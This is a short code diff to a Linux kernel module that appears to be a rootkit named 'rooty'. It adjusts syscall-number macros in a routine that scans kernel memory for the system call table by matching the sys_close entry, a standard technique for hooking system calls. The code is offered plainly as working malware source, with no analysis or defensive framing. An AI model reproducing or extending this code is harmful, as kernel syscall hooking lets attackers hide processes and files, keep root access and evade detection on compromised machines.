@@ -1,6 +1,7 @@
 #include <linux/module.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
+#include <linux/unistd.h>
 
 MODULE_LICENSE("GPL");
 int rooty_init(void);
@@ -8,7 +9,7 @@ void rooty_exit(void);
 module_init(rooty_init);
 module_exit(rooty_exit);
 
-#define __NR_CLOSE (__NR_SYSCALL_BASE+ 6) 
+/* #define __NR_CLOSE (__NR_SYSCALL_BASE+ 6)  */
 
 /* define what Architecture is used */
 #if defined(__i386__)
@@ -30,7 +31,7 @@ psize **find(void) {
  psize i = START_CHECK;
  while (i < END_CHECK) {
   sctable = (psize **) i;
-  if (sctable[__NR_CLOSE] == (psize *) sys_close) {
+  if (sctable[__NR_close] == (psize *) sys_close) {
    return &sctable[0];
   } 
   i += sizeof(void *);
